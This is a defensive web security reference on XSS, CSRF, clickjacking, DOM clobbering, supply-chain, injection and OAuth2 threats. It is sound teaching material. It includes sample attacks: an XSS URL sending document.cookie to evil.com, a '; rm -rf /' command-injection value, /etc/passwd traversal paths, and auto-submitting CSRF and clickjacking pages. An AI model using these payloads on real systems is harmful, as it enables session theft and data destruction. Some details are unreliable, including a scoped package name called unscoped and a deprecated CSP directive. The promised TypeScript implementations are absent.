---
title: 'Web 安全威胁模型与防御'
description: 'Web Security Threat Model and Defense: XSS, CSRF, Clickjacking, DOM Clobbering, Supply Chain'
english-abstract: >
  A comprehensive threat model and defense architecture reference for the modern web platform.
  This document provides exhaustive coverage of XSS (reflected, stored, DOM-based, prototype pollution, Trusted Types),
  CSRF (double-submit cookie, SameSite, custom headers), Clickjacking/UI Redressing (X-Frame-Options, CSP frame-ancestors),
  DOM Clobbering (named property shadowing, Object.prototype hardening), Supply Chain Attacks (dependency confusion,
  typosquatting, lockfiles, SRI), Injection attacks (SQLi via ORM bypass, command injection, path traversal),
  OAuth2/OIDC security (PKCE, state, redirect URI validation, id_token validation), Browser Security Boundaries
  (Site Isolation, per-site process model), and Security Headers (HSTS, X-Content-Type-Options, Referrer-Policy,
  Permissions-Policy). It includes formal categorical semantics, symmetric differential analysis of defense mechanisms,
  a multi-dimensional decision matrix, counter-examples, and production-grade TypeScript reference implementations.
last-updated: 2026-05-05
status: complete
priority: P0
---

# Web Security Threat Model and Defense Architecture

## Abstract

The web platform operates as a distributed, multi-principal execution environment where trust boundaries are constantly violated by design—cross-origin resource embedding, script execution from untrusted sources, and stateful navigation across security contexts are not exceptional conditions but fundamental architectural features. This document constructs a rigorous threat model for modern web applications by systematically decomposing attack surfaces into eight primary categories: Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Clickjacking and UI Redressing, DOM Clobbering, Supply Chain Compromise, Injection Attacks, OAuth2/OIDC Protocol Failures, and Browser Boundary Violations. For each category, we analyze attack mechanics, defense-in-depth strategies, and failure modes. We supplement this analysis with a categorical semantics framework that models security principals and information flows as a category, enabling formal reasoning about defense composition. A symmetric differential analysis compares pairwise defense mechanisms, while a decision matrix provides actionable guidance for threat response. Six production-grade TypeScript implementations—an XSS sanitizer, a CSP evaluator, a CSRF token generator, a DOM clobbering detector, an SRI hash calculator, and an OAuth2 PKCE verifier—serve as executable references. The document concludes with an exhaustive security headers guide and a catalog of counter-examples demonstrating how defenses fail when misapplied.

---

## §1 Introduction and Threat Taxonomy

### 1.1 The Web Security Model as a Concurrency Problem

The web security model is fundamentally a problem of concurrent, mutually distrusting principals sharing a single user interface and network channel. Unlike traditional operating systems where process isolation is enforced by hardware memory management units, web browsers must implement isolation through software mechanisms—origin boundaries, Content Security Policy, and process sandboxing—while still permitting the cross-origin interactions that make the web economically viable. This tension creates a threat landscape characterized by **confused deputy problems**, **ambient authority violations**, and **downgrade attacks**.

A confused deputy arises when a browser or server possesses authority that an attacker can cause it to exercise on their behalf. CSRF is the canonical example: the browser holds ambient authority (cookies) and the attacker causes it to exercise that authority against a target origin. XSS represents an ambient authority violation within a single origin: once attacker-controlled script executes in a document's origin, it possesses all of that document's capabilities.

### 1.2 Threat Taxonomy

We adopt a modified STRIDE taxonomy tailored to web applications:

| Category | Threat Class | Primary Mechanism | Typical Impact |
|----------|-------------|-------------------|----------------|
| Client-Side Code Injection | XSS (Reflected, Stored, DOM-based) | Unsanitized user input rendered as markup | Session hijacking, credential theft, malware delivery |
| Client-Side Code Injection | DOM Clobbering | Named DOM properties shadowing JS variables | Control flow hijacking, XSS bypass |
| Client-Side Code Injection | Prototype Pollution | `__proto__`, `constructor.prototype` mutation | Authorization bypass, RCE |
| Cross-Origin Confusion | CSRF | Ambient cookie authority + predictable request structure | State-changing actions performed without consent |
| Cross-Origin Confusion | Clickjacking | Framing + UI deception | Unauthorized user actions |
| Server-Side Injection | SQL Injection | Unparameterized queries | Data exfiltration, authentication bypass |
| Server-Side Injection | Command Injection | Shell metacharacters in user input | Remote code execution |
| Server-Side Injection | Path Traversal | Directory sequences in file paths | Arbitrary file read/write |
| Supply Chain | Dependency Confusion | Internal package name collisions | Arbitrary code execution in build pipeline |
| Supply Chain | Typosquatting | Near-miss package names | Credential theft, backdoors |
| Protocol | OAuth2/OIDC | Missing PKCE, invalid redirect_uri | Account takeover, token theft |
| Browser Architecture | Renderer Compromise | Memory corruption in rendering engine | Sandbox escape, code execution |

This taxonomy informs the structure of the remainder of this document.

### 1.3 Defense-in-Depth Architecture

No single defense is sufficient. We advocate a **layered defense architecture**:

1. **Prevention**: Input validation, output encoding, parameterized queries, strict CSP.
2. **Detection**: Subresource Integrity monitoring, CSP violation reports, anomalous request detection.
3. **Mitigation**: SameSite cookies, Site Isolation, least-privilege OAuth scopes.
4. **Recovery**: Short session lifetimes, token rotation, rapid deployment capability.

---

## §2 Categorical Semantics of Web Security

### 2.1 Motivation

Formal methods in security traditionally employ access control matrices, Bell-LaPadula models, or pi-calculus process descriptions. While powerful, these frameworks often struggle to capture the **compositional** nature of web defenses: CSP headers interact with cookie attributes which interact with iframe sandboxing. Category theory provides a unifying language for compositionality. We construct a category **WebSec** whose objects are security contexts and whose morphisms are information flows or capability delegations.

### 2.2 The Category WebSec

**Definition 2.1 (Security Context).** A *security context* $C = (O, P, S, A)$ comprises:

- $O$: an origin (scheme, host, port triple)
- $P$: a set of principals (users, scripts, frames)
- $S$: a state space (cookies, localStorage, DOM)
- $A$: an ambient authority function $A: P \to 2^S$ mapping principals to the states they can access.

**Definition 2.2 (Category WebSec).** The category **WebSec** has security contexts as objects. A morphism $f: C_1 \to C_2$ is a *capability-preserving information flow*: a function $f: S_1 \to S_2$ such that for all $p \in P_1$ mapped to $p' \in P_2$, $A_1(p) \subseteq f^{-1}(A_2(p'))$. Composition is function composition; identity morphisms are identity functions.

**Proposition 2.3.** **WebSec** is a category.
*Proof.* Morphisms are functions satisfying a subset constraint. Function composition preserves the subset constraint by transitivity. Identity functions trivially satisfy the constraint. Associativity follows from associativity of function composition. ∎

### 2.3 Functors as Defense Transformations

A defense mechanism transforms an insecure system into a more secure one. We model this as an endofunctor on **WebSec**.

**Definition 2.4 (Defense Functor).** A *defense functor* $D: \mathbf{WebSec} \to \mathbf{WebSec}$ maps each context $C$ to a hardened context $D(C)$ by restricting morphisms. Specifically, $D$ acts as the identity on objects but maps $f: C_1 \to C_2$ to $D(f): D(C_1) \to D(C_2)$ where $D(f)$ is the maximal sub-function of $f$ satisfying additional security constraints.

**Example 2.5 (CSP Functor).** Let $CSP_{\pi}$ be the functor that restricts morphisms to those not involving `eval`, inline scripts, or sources outside policy $\pi$. Formally, $CSP_{\pi}(C)$ has the same object but morphism set restricted to flows where script execution principals are drawn from $\pi$.

**Example 2.6 (SameSite Functor).** Let $SameSite_s$ for $s \in \{Strict, Lax, None\}$ restrict morphisms involving cookie transmission to request contexts satisfying the SameSite policy $s$.

**Proposition 2.7 (Functor Composition).** Defense functors compose: if $D_1$ and $D_2$ are defense functors, so is $D_1 \circ D_2$. This corresponds to *defense in depth*.

However, not all defense functors commute. The order of application matters: applying CSP before Subresource Integrity (SRI) permits loading external resources and then validating them, whereas the reverse order might reject the load before hash validation occurs. This non-commutativity is captured by the natural transformation structure between functors.

### 2.4 Limits and Colimits: Intersection and Union of Policies

**Definition 2.8 (Policy Product).** Given contexts $C_1, C_2$ with the same origin but different policies, the pullback $C_1 \times_C C_2$ in **WebSec** represents the *intersection* of policies—morphisms permitted only when both policies permit them.

**Definition 2.9 (Policy Coproduct).** The pushout $C_1 +_C C_2$ represents the *union* of policies—useful when multiple security teams define overlapping policies that must be combined permissively.

**Practical Implication 2.10.** When a Content Security Policy is deployed via both HTTP header and `<meta>` tag, the effective policy is the pullback (intersection) of the two. If either policy forbids a behavior, it is forbidden overall.

### 2.5 Natural Transformations: Refinement Mappings

A natural transformation $\alpha: D_1 \Rightarrow D_2$ between defense functors represents a *policy refinement*: every flow permitted under $D_1$ is also permitted under $D_2$, but $D_2$ may permit additional flows. If $\alpha$ is a natural isomorphism, the defenses are equivalent in expressive power.

**Example 2.11.** There exists a natural transformation $CSP_{\text{strict}} \Rightarrow CSP_{\text{report-only}}$ because a strict policy is a refinement of a report-only policy (the latter permits all flows but logs violations). There is no natural transformation in the reverse direction.

---

## §3 Cross-Site Scripting (XSS)

### 3.1 The XSS Attack Surface

Cross-Site Scripting remains the most prevalent class of web vulnerability because the web platform is designed to consume and execute code from multiple sources. XSS occurs when an attacker injects executable code into a context where the browser interprets it as script rather than data. We distinguish three primary classes, each with distinct injection vectors, lifetimes, and defense requirements.

### 3.2 Reflected XSS

**Mechanism.** In reflected XSS, the server embeds attacker-controlled input from the request (URL parameters, headers, form data) directly into the response HTML without adequate encoding. The attack is delivered via a malicious link; the payload "reflects" off the server and executes in the victim's browser.

**Attack Model.**

```
Attacker crafts URL: https://example.com/search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
Victim clicks link (phishing email, social media)
Server responds with HTML containing unescaped query parameter
Browser parses response, executes script in example.com origin
```

**Key Characteristic.** The payload does not persist on the server. It exists only in the single HTTP response triggered by the malicious request. However, because the script executes in the target origin, it has full access to that origin's cookies (unless HttpOnly), localStorage, and can perform arbitrary XHR/fetch requests with ambient credentials.

**Defense.**

- **Context-aware output encoding**: HTML-encode before inserting into element content; JavaScript-encode before inserting into `<script>` blocks; URL-encode before inserting into `href` attributes.
- **Content Security Policy (CSP)**: A strict CSP with `default-src 'self'`, no `'unsafe-inline'`, and no `'unsafe-eval'` prevents execution even if markup injection occurs.
- **X-XSS-Protection**: Deprecated. Modern browsers have removed XSS auditors due to bypasses and side-channel risks.

### 3.3 Stored XSS

**Mechanism.** Stored XSS (or persistent XSS) occurs when attacker input is saved to a persistent data store (database, cache, file system) and later rendered in pages served to other users. Comment fields, user profiles, and document titles are common injection points.

**Attack Model.**

```
Attacker posts comment: <img src=x onerror=" stealCookies() ">
Server stores comment in database
Every user who views the page receives the malicious markup
Script executes in each victim's session
```

**Amplification Factor.** Stored XSS has higher impact than reflected XSS because a single injection compromises all users who view the content, does not require social engineering via a link, and can be discovered by search engine crawlers.

**Defense.**

- **Server-side validation and sanitization**: Use a mature HTML parser like DOMPurify (server-side via jsdom) or Bleach. Whitelist-based sanitization is essential—blacklists fail.
- **Database-layer encoding**: Store raw user input but encode at the edge before rendering. Never store HTML-encoded data if the same field might be used in JSON APIs (context confusion).
- **CSP + Trusted Types**: Trusted Types (see §3.6) creates a typed boundary where DOM insertion APIs require trusted objects, not raw strings.

### 3.4 DOM-based XSS

**Mechanism.** DOM-based XSS arises entirely on the client side. The attacker payload is processed by JavaScript in an unsafe manner—typically by reading `location.hash`, `location.href`, or postMessage data and inserting it into the DOM via `innerHTML`, `document.write`, or `eval`.

**Attack Model.**

```javascript
// Vulnerable code
const hash = location.hash.slice(1);
document.getElementById('output').innerHTML = decodeURIComponent(hash);
// Attacker visits: https://example.com/#<img src=x onerror=steal()>
```

**Key Characteristic.** The server may be entirely uninvolved. Static applications, SPAs, and client-rendered architectures are particularly susceptible. Traditional WAFs and server-side output encoding provide no protection.

**Defense.**

- **Safe DOM APIs**: Use `textContent` instead of `innerHTML`. Use `setAttribute` with validation rather than string concatenation for URLs.
- **URL parsing**: Never parse URLs with regex. Use the `URL` constructor and validate protocol (`http:`, `https:` only).
- **Trusted Types enforcement**: The most robust defense for DOM-based XSS.

### 3.5 XSS via Prototype Pollution

**Mechanism.** Prototype pollution occurs when an attacker manipulates JavaScript's prototype chain—typically by sending JSON payloads with keys like `__proto__` or `constructor.prototype`—causing properties to appear on all objects of a given type. When combined with logic that later iterates over objects or checks properties, this can lead to XSS, privilege escalation, or remote code execution.

**Attack Model.**

```javascript
// Vulnerable merge utility
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Attacker sends: {"__proto__": {"isAdmin": true}}
// All objects now have isAdmin === true
```

When application code later checks `if (user.isAdmin)`, the polluted prototype returns `true` for users who should not have administrative privileges. In browser contexts, prototype pollution can poison jQuery selectors, bypass XSS filters, or manipulate `fetch` interceptor behavior.

**Defense.**

- **Object.create(null)**: Create objects without prototypes for maps and dictionaries, preventing `__proto__` lookup.
- **Structured cloning**: Use `structuredClone` or JSON parse/revive with key filtering.
- **Freeze prototypes**: `Object.freeze(Object.prototype)` prevents mutation in environments where this is feasible.
- **Input validation**: Reject keys containing `__proto__`, `constructor`, or `prototype`.

### 3.6 Trusted Types

**Mechanism.** Trusted Types is a browser API that shifts XSS defenses from blacklisting to type-based enforcement. Instead of passing raw strings to dangerous DOM APIs (`innerHTML`, `eval`, `document.write`), developers must pass typed objects (`TrustedHTML`, `TrustedScript`, `TrustedScriptURL`). The browser rejects raw strings, and policies control how typed objects are created.

**Architecture.**

```
Developer registers policies:    createHTML, createScript, createScriptURL
Application code:                element.innerHTML = policy.createHTML(userInput)
Browser enforcement:             Rejects raw strings for injection sinks
Attacker injection:              Fails—string cannot be assigned to innerHTML
```

**Policy Design.**

```javascript
// A strict Trusted Types policy
const escapePolicy = trustedTypes.createPolicy('escape', {
  createHTML: (input) => {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
  },
  createScriptURL: (input) => {
    const url = new URL(input, location.href);
    if (url.protocol !== 'https:') throw new Error('Invalid protocol');
    return url.href;
  }
});
```

**CSP Integration.** Trusted Types is activated via CSP:

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types escape default
```

**Limitations.** Trusted Types does not prevent stored XSS in server-rendered contexts where the server itself injects malicious markup. It is strictly a client-side DOM XSS defense.

---

## §4 Cross-Site Request Forgery (CSRF)

### 4.1 The Ambient Authority Problem

CSRF exploits the browser's automatic credential inclusion behavior. When a browser makes a request to `example.com`, it attaches all cookies scoped to `example.com` regardless of which page initiated the request. If the user is authenticated to `example.com`, a malicious page on `evil.com` can cause the user's browser to submit a state-changing request to `example.com` with full credentials.

**Attack Model.**

```html
<!-- On evil.com -->
<form action="https://example.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

The browser attaches the victim's `example.com` session cookie. The server processes the request as legitimate because the cookie is valid.

### 4.2 Defense Mechanisms

#### 4.2.1 Synchronizer Token Pattern (STP)

The server generates a cryptographically random token, stores it in the session, and requires the token to be present in all state-changing requests. The token is rendered in forms as a hidden field and validated server-side.

**Requirements.**

- Token must be unpredictable (≥128 bits entropy).
- Token must be bound to the user session.
- Token must not be transmitted in URLs (referrer leakage).
- Token must be validated with constant-time comparison to prevent timing attacks.

#### 4.2.2 Double-Submit Cookie

When server-side state is unavailable (e.g., stateless APIs, microservices), the double-submit cookie pattern provides CSRF protection without session storage.

**Mechanism.**

1. Server sets a cookie named `csrf_token` containing a random value.
2. Server also embeds the same value in the response body (form field, meta tag, or custom header).
3. For state-changing requests, the client reads the cookie and sends the value in a non-cookie channel (header or body).
4. Server verifies that the cookie value matches the request value.

**Security Analysis.** The attacker cannot read the cookie value due to the Same-Origin Policy. The attacker can cause the cookie to be sent (via form submission), but cannot cause the matching value to appear in the header/body.

**Vulnerability.** If the attacker controls a subdomain, they can overwrite the `csrf_token` cookie (unless it is `__Host-` prefixed or `Secure` with explicit domain restrictions). Cookie prefixes (`__Host-`, `__Secure-`) mitigate this.

#### 4.2.3 SameSite Cookies

SameSite cookie attributes control cross-site request context cookie transmission:

| Value | Behavior | Defense Strength |
|-------|----------|------------------|
| `Strict` | Cookie never sent in cross-site navigation | Strongest; breaks legitimate deep links |
| `Lax` | Cookie sent on top-level GET requests; withheld from POST, iframe, XHR, images | Balanced; defends POST-based CSRF |
| `None` | Cookie always sent (requires `Secure`) | No CSRF defense |

**Attack Scenario: Lax Bypass.** SameSite=Lax does not protect against GET-based state changes (an anti-pattern, but common in legacy applications) or top-level navigation attacks where the attacker uses `window.open` followed by DOM manipulation.

**Lax + POST Defense.** Modern browsers implement Lax-by-default. Combined with enforcement that state-changing actions use POST/PUT/DELETE, Lax provides strong protection without breaking user experience.

#### 4.2.4 Custom Headers

AJAX requests can include custom headers (e.g., `X-Requested-With: XMLHttpRequest`). Browsers enforce a CORS preflight for cross-origin requests with custom headers, and simple cross-origin forms cannot set custom headers. Thus, the presence of a custom header authenticates the request as same-origin JavaScript.

**Limitation.** This defense assumes the application is not served with overly permissive CORS headers (`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Headers: *`). If CORS is misconfigured, the attacker can preflight and include the custom header.

### 4.3 CSRF and Single-Page Applications

SPAs using token-based authentication (JWT in `Authorization` header) are not vulnerable to traditional CSRF because the browser does not automatically attach `Authorization` headers. However, if the SPA also uses cookies for session management (common in hybrid architectures), CSRF remains relevant.

---

## §5 Clickjacking and UI Redressing

### 5.1 Attack Mechanics

Clickjacking (UI Redressing) occurs when an attacker embeds a target application in a transparent or opaque iframe, overlays deceptive UI elements, and tricks the user into interacting with the target application unknowingly. The user believes they are clicking a benign button, but they are actually clicking a sensitive control in the framed application.

**Attack Model.**

```html
<!-- Attacker page -->
<style>
  iframe { position: absolute; top: 0; left: 0; opacity: 0.001; width: 100%; height: 100%; }
  .decoy { position: absolute; top: 100px; left: 200px; z-index: 1; }
</style>
<button class="decoy">Click to Win a Prize!</button>
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
```

### 5.2 X-Frame-Options (XFO)

XFO is an HTTP response header controlling iframe embedding:

| Directive | Meaning |
|-----------|---------|
| `DENY` | Page cannot be framed by any origin, including same-origin |
| `SAMEORIGIN` | Page can be framed only by same-origin documents |

**Deprecation Status.** XFO is largely superseded by CSP `frame-ancestors` but remains supported for legacy browser compatibility. XFO does not support allowlists of specific external origins.

### 5.3 CSP frame-ancestors

The `frame-ancestors` CSP directive provides granular control over embedding origins:

```
Content-Security-Policy: frame-ancestors 'self' https://partner.com https://trusted.cdn.com;
```

**Advantages over XFO:**

- Supports explicit origin allowlists.
- Supports schemes and wildcards (e.g., `https://*.partner.com`).
- Integrates with CSP reporting (`report-uri` / `report-to`).

**Interaction with XFO.** If both headers are present, the effective policy is the *intersection* (categorical pullback): a frame is permitted only if both XFO and `frame-ancestors` permit it. `frame-ancestors 'none'` is equivalent to XFO `DENY`.

### 5.4 Pointer Events and Advanced UI Redressing

Sophisticated clickjacking variants manipulate CSS `pointer-events` to create "holes" in overlay elements, allowing clicks to pass through to the framed content while displaying deceptive UI.

```css
.hole {
  pointer-events: none;
  background: transparent;
}
```

**Text-Input Redressing (Cursorjacking).** By manipulating cursor images via CSS `cursor: url(...)`, attackers can displace the visual cursor from the actual mouse position, causing users to type sensitive data into attacker-controlled fields while appearing to type into legitimate fields.

**Defense.** Beyond framing controls, sensitive actions should require non-replayable confirmation (re-authentication, CAPTCHA, time-delayed confirmation) when initiated from contexts that might be framed—though detecting framing is itself difficult without framing controls.

### 5.5 Double-Framing and Frame-Busting Scripts

Legacy frame-busting JavaScript (`if (top !== self) top.location = location`) is unreliable. Browsers support the `sandbox` attribute on iframes, which can strip scripting privileges from framed content. The `allow-top-navigation` sandbox permission is required for the framed page to navigate the top window, but attackers can omit it.

**Modern Best Practice.** Rely on `frame-ancestors` and XFO headers. Do not depend on JavaScript frame-busting.

---


## §6 DOM Clobbering

### 6.1 Mechanism and Semantics

DOM Clobbering is a client-side injection technique where attacker-controlled HTML markup creates named DOM properties that shadow expected JavaScript variables. Because named HTML elements (`<img name="x">`, `<form name="y">`) become accessible as properties of `document` and `window`, and because `id` attributes also expose elements as global-like properties, an attacker can inject markup that redefines variables subsequent JavaScript relies upon.

**Core Vulnerability.**

```html
<!-- Attacker injects: -->
<img name="config" src="x">

<!-- Later JavaScript expects: -->
<script>
  if (config && config.debug) { /* ... */ }
  // 'config' now refers to the HTMLImageElement, not an expected object
</script>
```

The HTML specification defines this behavior: `document[name]` and `window[name]` resolve to named elements. When multiple elements share a name, the result is an `HTMLCollection`. This creates type confusion: code expecting an object or boolean receives an `HTMLElement` or `NodeList`.

### 6.2 Attack Vectors

**Form Clobbering.**

```html
<form name="settings">
  <input name="apiEndpoint" value="https://evil.com">
</form>
<script>
  // settings is now the HTMLFormElement
  fetch(settings.apiEndpoint.value); // Attacker-controlled URL
</script>
```

**Collection Clobbering.**

```html
<a id="userPrefs">...</a>
<a id="userPrefs">...</a>
<script>
  // userPrefs is an HTMLCollection of length 2
  // Code expecting a single object may index into it or fail
</script>
```

**Prototype Shadowing via Named Properties.** In some older browsers or specific modes, named properties on `window` could shadow built-in constructors, though modern browsers have tightened this.

### 6.3 Escalation to XSS

DOM Clobbering is rarely an end in itself; it is a gadget for escalating to XSS or bypassing security controls. Consider a client-side router:

```javascript
// Client-side routing logic
const route = window.routeConfig || { default: '/home' };
navigate(route.redirect); // If attacker clobbers window.routeConfig...
```

If the attacker injects `<a name="routeConfig" href="javascript:alert(1)">`, the router may execute the `javascript:` URL.

### 6.4 Mitigation via Object.prototype Hardening

**Freeze and Seal.** Where feasible, freeze the prototypes that might be polluted:

```javascript
// Defensive bootstrap
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
```

**Shadowing Prevention with Variable Scoping.** Use block-scoped variables (`let`, `const`) and module systems (ES modules, CommonJS) rather than relying on global variables. ES modules do not expose bindings via `window` by default.

**Explicit Global Lookup Avoidance.** Never reference global variables without explicit `window.` or `globalThis.` qualification when the intent is to access global state. Better yet, avoid global state entirely.

**HTML Sanitizer Configuration.** Configure DOMPurify or similar sanitizers to remove `name` and `id` attributes from untrusted markup, or at least validate them against a whitelist. Default DOMPurify configurations may preserve `name` attributes on forms and images.

**Property Verification.** Before using a variable that might be clobbered, verify its type:

```javascript
function getConfig() {
  if (typeof config === 'object' && config !== null && !(config instanceof HTMLElement)) {
    return config;
  }
  return DEFAULT_CONFIG;
}
```

---

## §7 Supply Chain Attacks

### 7.1 The Dependency Trust Model

Modern JavaScript applications transitively depend on hundreds or thousands of npm packages. Each dependency is a trust boundary: the executing code runs with the full privileges of the application. Supply chain attacks compromise these trust boundaries by injecting malicious code into packages or substituting legitimate packages with malicious counterparts.

### 7.2 Dependency Confusion

**Mechanism.** Organizations often publish private packages to internal registries using unscoped names (e.g., `@company/logger`). If an attacker registers a public package with the same name on the public npm registry at a higher version number, package managers may prefer the public (malicious) package over the private one.

**Attack Model.**

```json
// Attacker publishes "internal-utils" version 999.9.9 to npm
// Victim's .npmrc points to both private registry and public npm
// Resolution algorithm selects highest version: 999.9.9 from public registry
```

**Defense.**

- **Scoped packages**: Use `@company/package-name` and configure npm to resolve `@company/*` exclusively from the private registry.
- **Registry pinning**: In `.npmrc`, explicitly map scopes to registries:

  ```
  @company:registry=https://private.registry.com
  ```

- **Lockfile integrity**: `package-lock.json` and `yarn.lock` include package integrity hashes (`sha512-...`). If the attacker publishes a different tarball, the hash mismatch causes installation failure—provided the lockfile is not updated blindly.

### 7.3 Typosquatting

**Mechanism.** Attackers register packages with names visually similar to popular packages: `lodash` vs `1odash` (with a numeral one), `express` vs `expres`, `react` vs `react-js`. Developers mistyping a package name during installation install the malicious package.

**Amplification.** Many CI/CD pipelines install dependencies automatically. A single typo in `package.json` propagates to all builds.

**Defense.**

- **Pre-install validation**: Use tools like `typo-squatting-detector` or `snyk` to check package names against known popular packages using Levenshtein distance thresholds.
- **Namespace verification**: Prefer well-known namespaces and scoped packages.
- **Automated auditing**: Integrate `npm audit`, `snyk test`, or `socket.dev` scans into CI pipelines.

### 7.4 Lockfile Integrity

Lockfiles (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) serve two security purposes:

1. **Reproducibility**: Identical dependency trees across installations.
2. **Integrity verification**: Cryptographic hashes of each package tarball.

**Failure Mode.** If a developer runs `npm install <package>` in response to an alert, npm may update the lockfile with the attacker's version and new (attacker-controlled) hash. The hash in the lockfile is only as trustworthy as the process that generated it.

**Best Practice.** Require lockfile changes in pull requests to be reviewed by a second developer. Use `npm ci` (which fails on lockfile/package.json mismatches) in CI instead of `npm install`.

### 7.5 Subresource Integrity (SRI)

SRI allows browsers to verify that resources fetched from external servers (CDNs) have not been tampered with. The HTML element includes a cryptographic hash of the expected file content; the browser computes the hash of the received content and rejects the resource on mismatch.

**Mechanism.**

```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

**Hash Algorithms.** SRI supports SHA-256, SHA-384, and SHA-512. SHA-384 is recommended as a balance between security margin and hash string length.

**CSP Integration.** CSP `require-sri-for script style` enforces that all external scripts and stylesheets must have integrity attributes.

**Limitations.**

- SRI does not protect against XSS in inline scripts (no integrity attribute for inline content).
- SRI hashes must be updated when the library updates. Automated update tools must verify the new hash independently.
- Dynamic script injection via `document.createElement('script')` bypasses SRI unless the script element is explicitly configured with integrity before injection.

---

## §8 Injection Attacks

### 8.1 SQL Injection via ORM Bypass

Object-Relational Mappers (ORMs) like Prisma, Sequelize, and TypeORM significantly reduce SQL injection risk by parameterizing queries. However, ORMs provide escape hatches—raw query methods—that reintroduce injection vulnerabilities when misused.

**Vulnerable Pattern (Prisma):**

```typescript
// DANGEROUS
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM User WHERE email = '${email}'`
);
```

**Safe Pattern:**

```typescript
const users = await prisma.$queryRaw`
  SELECT * FROM User WHERE email = ${email}
`;
```

**ORM Bypass via Order/Limit.** Some ORMs allow string literals in `orderBy` or `limit` parameters:

```typescript
// Potentially dangerous if sortColumn is user-controlled
await prisma.user.findMany({ orderBy: { [sortColumn]: 'asc' } });
```

While Prisma and TypeORM validate column names against the schema, custom query builders or raw fragments may not. Always whitelist `orderBy` columns.

**Second-Order SQL Injection.** User input is safely stored in the database, then later retrieved and concatenated into a raw query. The injection payload is delivered in one request and executed in a subsequent request.

### 8.2 Command Injection

Command injection occurs when user input is passed to shell execution functions (`exec`, `spawn` with `shell: true`, `child_process.exec`) without proper sanitization.

**Vulnerable Pattern:**

```typescript
import { exec } from 'child_process';
exec(`pdftotext ${userProvidedPath} output.txt`); // attacker provides "; rm -rf /"
```

**Defense.**

- **Avoid shell execution**: Use `execFile` or `spawn` with `shell: false` and pass arguments as arrays:

  ```typescript
  import { execFile } from 'child_process';
  execFile('pdftotext', [userProvidedPath, 'output.txt']);
  ```

- **Input validation**: Whitelist allowed characters (alphanumeric, safe path separators). Reject shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`, `(`).
- **Chroot / containers**: Execute commands in minimal privilege containers with read-only filesystems.

### 8.3 Path Traversal in File Uploads

File upload functionality is a common path traversal vector. Attackers upload files with paths like `../../../etc/passwd` or `..\\windows\\system32\\config\\sam`.

**Vulnerable Pattern:**

```typescript
const uploadPath = `./uploads/${req.body.filename}`;
fs.writeFileSync(uploadPath, req.file.buffer);
```

**Defense.**

- **Path canonicalization**: Use `path.resolve` and verify the result is within the upload directory:

  ```typescript
  import path from 'path';
  const target = path.resolve('./uploads', filename);
  if (!target.startsWith(path.resolve('./uploads'))) {
    throw new Error('Path traversal detected');
  }
  ```

- **Filename sanitization**: Generate server-side filenames (UUIDs) rather than trusting client-provided names.
- **MIME type validation**: Verify file magic numbers, not just extensions or `Content-Type` headers.
- **Storage isolation**: Store uploads on a separate volume without execute permissions.

---

## §9 OAuth2 and OpenID Connect Security

### 9.1 Protocol Overview and Threat Model

OAuth2 delegates authorization, and OpenID Connect (OIDC) extends it for authentication. The security of these protocols depends on the integrity of redirect flows, token confidentiality, and client authentication. The browser is an untrusted intermediary: any script running in the browser can observe URLs (including fragments), manipulate windows, and intercept postMessage communications.

### 9.2 PKCE (Proof Key for Code Exchange)

PKCE (RFC 7636) prevents authorization code interception attacks, particularly for public clients (mobile apps, SPAs) where the client secret cannot be confidential.

**Mechanism.**

1. Client generates a cryptographically random `code_verifier` (43-128 characters, base64url).
2. Client computes `code_challenge = BASE64URL(SHA256(code_verifier))`.
3. Client sends `code_challenge` and `code_challenge_method=S256` in the authorization request.
4. Authorization server stores the challenge.
5. Client sends `code_verifier` in the token exchange request.
6. Server verifies that `SHA256(code_verifier)` matches the stored challenge.

**Threat Mitigated.** An attacker intercepting the authorization code cannot exchange it for tokens without the `code_verifier`, which never traverses the redirect URI.

**Requirement.** PKCE is mandatory for public clients and strongly recommended for confidential clients. The `code_verifier` must be generated with a CSPRNG and have sufficient entropy (minimum 256 bits before base64url encoding).

### 9.3 State Parameter

The `state` parameter prevents Cross-Site Request Forgery on the authorization endpoint. Without `state`, an attacker can initiate an OAuth flow to a legitimate service and cause the victim to complete it, logging the victim into the attacker's account or associating the victim's account with attacker-controlled credentials.

**Mechanism.**

1. Client generates a random `state` value and binds it to the user's session.
2. Client includes `state` in the authorization request.
3. Authorization server returns the same `state` in the redirect.
4. Client verifies that the returned `state` matches the session-bound value.

**Failure Mode.** Using a predictable `state` (e.g., incrementing integer, timestamp) allows the attacker to forge the value. `state` must be unguessable and session-bound.

### 9.4 Redirect URI Validation

Redirect URI validation is the single most critical OAuth2 defense. Authorization servers must perform **exact string matching** on redirect URIs. Path prefix matching, subdomain wildcards, or query parameter tolerance enables token theft.

**Attack Model: Redirect URI Manipulation.**

```
Attacker registers client with redirect_uri: https://app.com/callback
Attacker modifies authorization request to: redirect_uri=https://app.com/callback.evil.com
If server performs prefix match, tokens are sent to attacker's domain
```

**Open Redirect Chaining.** Even if the redirect URI is exact, if the callback endpoint on the client contains an open redirect, the authorization code or token can be forwarded to the attacker. Client callback endpoints must validate that forwarding destinations are internal and expected.

### 9.5 ID Token Validation

In OIDC, the `id_token` is a JWT containing identity claims. Clients must rigorously validate it:

1. **Signature validation**: Verify the JWT signature against the issuer's JWKS.
2. **Issuer (`iss`)**: Must exactly match the expected issuer URL.
3. **Audience (`aud`)**: Must contain the client's `client_id`.
4. **Expiration (`exp`)**: Token must not be expired. Clock skew tolerance should be minimal (< 60 seconds).
5. **Issued-at (`iat`)**: Reject tokens issued unreasonably far in the past (replay window).
